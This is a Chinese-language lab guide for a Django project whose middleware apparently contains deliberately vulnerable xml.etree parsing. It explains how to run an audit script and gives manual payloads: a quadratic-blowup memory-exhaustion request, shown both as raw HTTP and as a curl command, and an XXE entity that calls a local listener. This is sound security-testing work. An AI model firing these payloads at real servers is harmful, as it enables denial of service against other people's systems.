# XML 漏洞复现与服务启动指南

本指南包含如何启动 Django 服务，以及如何使用提供的脚本或手动方式复现针对 `xml.etree.ElementTree` 的安全测试。

## 1. 启动服务 (Start Server)

所有的项目文件位于 `CAS_XML_PEN` 目录中。

**步骤：**

1.  打开终端 (Terminal)。
2.  进入项目目录：
    ```powershell
    cd D:\Trae_Projects\CAS\CAS_XML_PEN
    ```
3.  使用虚拟环境启动 Django 服务：
    ```powershell
    ..\.venv\Scripts\python manage.py runserver
    ```
    *(服务将运行在 http://127.0.0.1:8000/)*

---

## 2. 自动化审计 (Automated Audit)

我们保留了一个核心审计脚本 `final_audit_xml_etree.py`，它集成了多种攻击向量（XXE, OOB, DoS）来全面评估当前代码的安全性。

**运行方法：**

保持上面的 Django 服务运行，打开一个新的终端窗口：

```powershell
cd D:\Trae_Projects\CAS\CAS_XML_PEN
..\.venv\Scripts\python final_audit_xml_etree.py
```

**脚本功能：**
- **检测 XXE (OOB)**: 尝试外带数据（预期失败，证明当前环境对常规 XXE 安全）。
- **检测 DoS (Billion Laughs)**: 指数级实体扩展攻击（预期被 Python 解释器拦截）。
- **检测 DoS (Quadratic Blowup)**: 二次爆炸攻击（**预期成功**，这是主要风险点）。

---

## 3. 手动复现指南 (Manual Reproduction)

如果你想使用 Burp Suite 或 Curl 手动测试，请参考以下 Payload。

### 目标 URL
`POST http://127.0.0.1:8000/admin/` (或任何触发中间件的路径)

### 场景 A: 拒绝服务 - 二次爆炸 (Quadratic Blowup) - **[有效]**
这是针对 `xml.etree` 最有效的攻击方式。它利用大实体多次重复导致内存耗尽。

**Payload (Raw Request):**

```http
POST /admin/ HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: [自动计算]

logoutRequest=%3C%3Fxml+version%3D%221.0%22%3F%3E%3C%21DOCTYPE+root+%5B%3C%21ENTITY+large+%22AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%22%3E%5D%3E%3Croot%3E%26large%3B%26large%3B%26large%3B%26large%3B%26large%3B%26large%3B%26large%3B%26large%3B%26large%3B%26large%3B%3C%2Froot%3E
```
*(注意：实际攻击中 `large` 实体的内容需要非常长，例如 50000 个字符，重复引用多次)*

**Curl 命令示例:**
```bash
# 生成一个包含巨大实体的 Payload
# 注意：这可能会导致服务器短暂卡顿
curl -X POST http://127.0.0.1:8000/admin/ -d "logoutRequest=<?xml version='1.0'?><!DOCTYPE root [<!ENTITY large 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... (重复5万次) ...'>]><root>&large;&large;&large;&large;&large;</root>"
```

### 场景 B: XML 外部实体注入 (XXE) - **[无效但用于验证]**
用于证明当前环境默认防御了 XXE。

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:9999/xxe_hit">
]>
<root>&xxe;</root>
```

**预期结果**：服务器返回错误或忽略实体，因为 Python 的 `xml.etree` (Expat parser) 默认 `resolve_entities=False`。

---

## 4. 文件说明

- `vuln_project/`: Django 项目源码。
- `midware.py`: 包含漏洞代码的中间件文件。
- `final_audit_xml_etree.py`: 综合审计工具。
- `XML_ETREE_ANALYSIS_REPORT.md`: 详细的技术分析报告。
- `audit_log.txt`: 审计脚本的运行日志。
